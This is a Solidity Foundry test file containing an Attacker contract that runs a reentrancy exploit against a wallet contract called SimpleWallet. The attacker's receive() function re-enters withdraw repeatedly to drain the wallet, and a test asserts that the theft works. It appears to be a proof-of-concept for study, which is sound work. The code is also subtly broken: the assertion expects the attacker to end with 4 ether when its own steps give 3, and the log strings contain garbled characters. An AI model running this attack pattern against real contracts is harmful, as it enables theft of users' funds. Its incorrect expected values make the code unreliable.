// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/SimpleWallet.sol";

contract SimpleWalletExploitTest is Test {
    SimpleWallet wallet;
    Attacker attacker;
    
    address owner = address(1);
    address user1 = address(2);
    
    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user1, 5 ether);
        
        vm.prank(owner);
        wallet = new SimpleWallet();
    }
    
    function testReentrancyAttack() public {
        // 1. Normal user deposits
        vm.prank(user1);
        wallet.deposit{value: 2 ether}();
        
        // 2. Deploy attack contract
        attacker = new Attacker(address(wallet));
        
        // 3. Attack contract also deposits
        vm.deal(address(attacker), 1 ether);
        attacker.deposit{value: 1 ether}();
        
        // 4. Check initial balance
        assertEq(address(wallet).balance, 3 ether); // 2 ether from user1 + 1 ether from attacker
        
        // 5. Execute attack
        attacker.attack();
        
        // 6. Verify contract is drained
        assertEq(address(wallet).balance, 0, "Wallet should be drained");
        
        // 7. Verify attacker got all funds
        assertEq(address(attacker).balance, 4 ether, "Attacker should have all funds");
        
        console.log("ğŸ¯ Attack successful!");
        console.log("Initial wallet balance: 3 ETH");
        console.log("Final wallet balance: %s ETH", address(wallet).balance);
        console.log("Attacker balance: %s ETH", address(attacker).balance);
    }
    
    function testSafeWithdrawal() public {
        // Test normal (non-attack) scenario
        vm.prank(user1);
        wallet.deposit{value: 1 ether}();
        
        uint initialBalance = user1.balance;
        
        vm.prank(user1);
        wallet.withdraw(0.5 ether);
        
        assertEq(user1.balance, initialBalance + 0.5 ether);
        console.log("âœ… Normal withdrawal works correctly");
    }
}

contract Attacker {
    SimpleWallet public target;
    uint public count;
    
    constructor(address _target) {
        target = SimpleWallet(_target);
    }
    
    function deposit() external payable {
        target.deposit{value: msg.value}();
    }
    
    function attack() external {
        // Assuming attacker deposited 1 ether
        target.withdraw(1 ether);
    }
    
    // receive function called when receiving ETH
    receive() external payable {
        count++;
        console.log("ğŸ”„ Reentrancy call #%d", count);
        
        // Continue attack while target has funds
        if (address(target).balance >= 1 ether && count < 10) {
            target.withdraw(1 ether);
        }
    }
    
    // To withdraw funds from attack contract
    function withdrawAll() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}